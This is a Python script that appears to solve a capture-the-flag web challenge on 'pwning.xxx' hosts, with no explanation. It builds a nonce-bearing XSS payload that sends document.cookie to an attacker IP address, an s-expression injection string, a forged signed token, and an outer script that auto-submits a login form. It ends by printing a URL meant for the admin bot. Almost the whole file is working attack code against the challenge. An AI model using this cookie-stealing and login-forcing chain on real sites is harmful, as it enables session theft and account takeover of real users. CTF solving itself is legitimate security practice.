import urllib

seed = "zach"
#nonce = "76uP8F0R8/gxB8SKuZaHm/7sSVAJWiZx44m+T5s+56xD0h6W4z4xUSOVUNTX0ZvU+vgvf5YwE7AP1tr+XqKnpQ=="
nonce = "P179M2ydafV7eDiqkc1fvAQfjmCBavE73SYO0Kn0UTjvw2T8lcaKNGAlX5HZZeWkjtxwWf7Z25ZRuZnTKkSjvg=="

updator = "sexp-updator.chal.pwning.xxx"
samoa   = "sexp-samoauth.chal.pwning.xxx"

me      = "67.171.68.180:8000"
me      = "128.237.184.102:8000"

innerXSS = "<script  nonce='{}'>location.href=`http://{}/?cookie=${{document.cookie}}`</script>".format(nonce, me);

innerPayload = ")) (pwn @\"Math.seedrandom`{}`\") (@\"foo`f`\") ((".format(seed);

print(" Create user with name: ")
print(innerXSS);
print("and password: 'whoami'. Then sign them into upd8t0r\n")
print("Now create a token for yourself with these contents: ")
print(innerPayload);
print("and copy it into the script\n")

# Create account and get signed token using those

token = "KChuYW1lICI8c2NyaXB0ICBub25jZT0nUDE3OU0yeWRhZlY3ZURpcWtjMWZ2QVFmam1DQmF2RTczU1lPMEtuMFVUanZ3MlQ4bGNhS05HQWxYNUhaWmVXa2p0eHdXZjdaMjVaUnVablRLa1Nqdmc9PSc%2BbG9jYXRpb24uaHJlZj1gaHR0cDovLzEyOC4yMzcuMTg0LjEwMjo4MDAwLz9jb29raWU9JHtkb2N1bWVudC5jb29raWV9YDwvc2NyaXB0PiIpIChlbWFpbCAidGVzdDNAd2EuZGUiKSAoY29sb3IgbnVsbCkgKGZvb2QgbnVsbCkgKHBlcm0gKCkpIChwd24gQCJNYXRoLnNlZWRyYW5kb21gemFjaGAiKSAoQCJmb29gZmAiKSAoKCkpKQ%3D%3D.eS5QAQYl0CRsD3aQWq5T0l8GnAFzZotkC%2BZy%2BRoqzzM0pu7%2BYq4jmV3qOd%2BZ%2FfUH1ZItDfqfW3%2FwivvHTN4dVIK4jL0P2i%2Bhgug2Mb00ejHiFaq34FVGIPkN6Gcrf2kkzqMqJUStRqKiMfw%2FlYEBohprX6jHUoh468YJAbZrj9tOwx%2FJf6tcKYXc%2BNOfrpQ3XLxtlXsnjiDecqP2C4N%2BYLY30%2BEuI%2BCZbXBhuJuzyh0W%2FvdqR%2FQAX%2BzkNt6gD%2F6xn%2BbFGhlvKPREkSVbUqjl6JQD%2BneQhzt62bPZ6Ni3SLah9MYJrWyXVViuTGs8gVsgWvBxckXIfxhYfPbgeQdny7qZma%2Bp6SaU3suKdCGahgPZ55uNPhFdBPBi0oJlOBrwMeC55gIcguaHxqY4Y%2FPHrTKeBdpiaVYqOPLg%2FoYoBtnMguiqTUo3Av5gUe6UTWqQki4mcxz7TjdbH85xaLyyLXs72pqli0jevAa3C9OB1yTWx%2FiZMdfblSwcOPmmBQgMSb67gL2WtsulnSosEQ3yFi8evZdbQIQye%2FsuPDTd4cxjr4AxhnGMOxYUS%2FMfwlgi9P36fsSWdx0L1qh3dwlWWb77dalpVYTwdNjUQX0So3m5ax2LcoQeKDyStZ7BwpOlbLzusSQWQ3b6yFmQ9ke8KI%2BtGrqk9HqAE8c0G91WuCg%3D"

outerXSS = "<script id='firstFlag'><script>fetch('http://{}/login?token={}', {{ credentials: 'include' }}); a = document.createElement('form'); a.method='POST'; a.action='http://{}/login'; b = document.createElement('input'); b.value='whoami'; b.name='password'; a.appendChild(b); document.body.appendChild(a); a.submit(); setTimeout(() => a.submit(), 100)</script></script>".format(updator, token, updator)

embedable = urllib.quote(outerXSS)

redirected = "http://{}/samoa?opts[]=user%3d{}%26f".format(updator, urllib.quote(embedable)) 

print("Finally, send this url to the admin:")
print(redirected)
